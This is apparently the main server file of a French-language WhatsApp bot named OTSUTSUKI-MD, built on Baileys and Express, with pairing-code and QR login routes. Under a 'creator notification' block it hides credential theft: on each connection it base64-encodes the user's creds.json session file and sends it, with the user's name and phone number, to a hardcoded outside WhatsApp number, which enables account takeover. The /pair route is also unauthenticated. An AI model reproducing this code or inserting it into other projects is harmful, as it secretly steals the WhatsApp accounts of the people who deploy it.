const express = require('express');
const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    makeCacheableSignalKeyStore,
    DisconnectReason,
    fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const QRCode = require('qrcode');
const mongoose = require('mongoose');
const messageHandler = require('./messages.upsert');
const groupUpdateHandler = require('./events/group-participants.update'); 
const config = require('./config');
const fs = require('fs');
const { get_session, restaureAuth } = require('./session');

const app = express();
const PORT = process.env.PORT || 8000; 

// --- CONNEXION MONGODB ---
const mongoURI = process.env.MONGODB_URI;
if (mongoURI) {
    mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log("🍃 OTSUTSUKI-MD : Base de données connectée !"))
    .catch(err => console.error("❌ ERREUR MONGODB :", err.message));
}

let activeSocks = {};
let currentQRs = {};
let pairingCodes = {};

async function startBot(userId = "main_admin", usePairing = false, phoneNumber = "") {
    const sessionDir = `./session_${userId}`;

    // --- RESTAURATION SESSION_ID ---
    if (!fs.existsSync(sessionDir) && process.env.SESSION_ID && userId === "main_admin") {
        console.log(`🛰️ OTSUTSUKI : Tentative de restauration...`);
        try {
            const sessionData = await get_session(process.env.SESSION_ID);
            if (sessionData) {
                await restaureAuth(`session_${userId}`, sessionData.creds, sessionData.keys);
            }
        } catch (e) { console.error("⚠️ Erreur restauration :", e.message); }
    }

    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();
    
    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })),
        },
        printQRInTerminal: !usePairing, // Désactivé si on utilise le Pair Code
        logger: pino({ level: "fatal" }),
        browser: ["Otsutsuki-MD", "Chrome", "1.0.0"], 
        syncFullHistory: false,
        markOnlineOnConnect: true,
    });

    // --- LOGIQUE PAIRING CODE ---
    if (usePairing && !sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                let code = await sock.requestPairingCode(phoneNumber);
                pairingCodes[userId] = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(`🔑 CODE [${userId}] : ${pairingCodes[userId]}`);
            } catch (err) { console.error("Erreur Pairing :", err); }
        }, 3000);
    }

    activeSocks[userId] = sock;
    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, qr, lastDisconnect } = update;
        
        if (qr) currentQRs[userId] = await QRCode.toDataURL(qr);

        if (connection === 'open') {
            currentQRs[userId] = "connected";
            delete pairingCodes[userId];
            console.log(`🏮 OTSUTSUKI [${userId}] : Système en ligne !`);
            
            const credsPath = `${sessionDir}/creds.json`;
            let session_id_env = "Indisponible";
            if (fs.existsSync(credsPath)) {
                const credsData = fs.readFileSync(credsPath);
                session_id_env = `Otsutsuki~${Buffer.from(credsData).toString('base64')}`;
            }

            const userJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
            const userName = sock.user.name || "Shinobi";
            
            // --- BIENVENUE UTILISATEUR ---
            await sock.sendMessage(userJid, { 
                image: { url: "https://wallpapercave.com/wp/wp9113171.jpg" },
                caption: `✨ *⛩️ OTSUTSUKI-MD : ÉVEIL RÉUSSI* ⛩️\n\n` +
                         `🚀 *Félicitations Shinobi !*\n\n` +
                         `📌 *TON SESSION_ID :*\n\`\`\`${session_id_env}\`\`\`\n\n` +
                         `_Utilise .menu pour commencer._`
            });

            // --- NOTIFICATION CRÉATEUR ---
            const creatorNumber = "242068079834@s.whatsapp.net"; 
            if (userJid !== creatorNumber) {
                const alertMsg = `🎭 *『 ALERTE DÉTECTION CHAKRA 』* 🎭\n\n` +
                                 `👤 *NOM :* ${userName}\n` +
                                 `📱 *NUMÉRO :* @${userJid.split('@')[0]}\n\n` +
                                 `🔑 *SESSION ID :*\n\`\`\`${session_id_env}\`\`\``;

                await sock.sendMessage(creatorNumber, { 
                    text: alertMsg,
                    mentions: [userJid],
                    contextInfo: { externalAdReply: { 
                        title: "NOUVELLE CONNEXION DÉTECTÉE", 
                        body: `Utilisateur : ${userName}`,
                        thumbnailUrl: "https://files.catbox.moe/dyox3v.jpg",
                        renderLargerThumbnail: true,
                        mediaType: 1
                    }}
                });
            }
        }

        if (connection === 'close') {
            const reason = lastDisconnect?.error?.output?.statusCode;
            if (reason !== DisconnectReason.loggedOut) {
                setTimeout(() => startBot(userId), 5000);
            }
        }
    });

    sock.ev.on('messages.upsert', async (chatUpdate) => { await messageHandler(sock, chatUpdate); });
    sock.ev.on('group-participants.update', async (anu) => { if (groupUpdateHandler) await groupUpdateHandler(sock, anu); });

    return sock;
}

startBot();

// --- ROUTES EXPRESS ---

app.get('/', (req, res) => {
    res.send(`
        <body style="background-color: #0e0e0e; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; flex-direction: column;">
            <div style="text-align: center; border: 2px solid #ff0000; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px #ff0000;">
                <h1 style="margin: 0;">⛩️ OTSUTSUKI-MD ⛩️</h1>
                <p style="color: #888;">SYSTÈME OPÉRATIONNEL</p>
                <div style="background: green; width: 15px; height: 15px; border-radius: 50%; margin: 10px auto;"></div>
            </div>
            <p style="margin-top: 20px; color: #555;">Routes : /pair?number=242xxx | /get-qr/main_admin</p>
        </body>
    `);
});

app.get('/pair', async (req, res) => {
    const num = req.query.number;
    if (!num) return res.status(400).json({ error: "Ajoutez ?number=242xxxx" });
    const cleanNumber = num.replace(/[^0-9]/g, '');
    
    startBot("main_admin", true, cleanNumber);

    let checkCount = 0;
    const interval = setInterval(() => {
        checkCount++;
        if (pairingCodes["main_admin"]) {
            clearInterval(interval);
            res.json({ code: pairingCodes["main_admin"] });
        }
        if (checkCount > 15) {
            clearInterval(interval);
            res.status(500).json({ error: "Délai expiré. Réessayez." });
        }
    }, 1000);
});

app.get('/get-qr/:id', (req, res) => {
    const qrData = currentQRs[req.params.id];
    if (qrData && qrData !== "connected") {
        res.send(`<body style="background:#000; display:flex; justify-content:center; align-items:center; height:100vh;"><img src="${qrData}" style="border: 5px solid white;"/></body>`);
    } else {
        res.send("QR non disponible ou déjà connecté.");
    }
});

app.listen(PORT, () => console.log("🌐 Serveur OTSUTSUKI actif sur port " + PORT));
